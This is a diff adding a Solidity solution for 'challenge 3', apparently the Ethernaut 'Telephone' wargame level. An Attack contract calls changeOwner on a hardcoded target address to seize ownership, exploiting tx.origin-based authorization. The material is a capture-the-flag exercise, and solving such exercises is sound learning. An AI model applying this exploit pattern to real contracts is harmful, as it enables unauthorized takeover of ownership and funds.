@@ -43,3 +43,22 @@ contract Attack {
     }
 }
 ```
+
+### challenge 3
+
+```
+pragma solidity ^0.8.0;
+
+interface Telephone {
+    function changeOwner(address) external;
+}
+
+contract Attack {
+    address telephoneAddress = 0x0bDb4C476e8719Db25Baac7Ab796008023C5Ed3A;
+    address myAddress = 0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88;
+
+    function attack() public {
+        Telephone(telephoneAddress).changeOwner(myAddress);
+    }
+}
+```
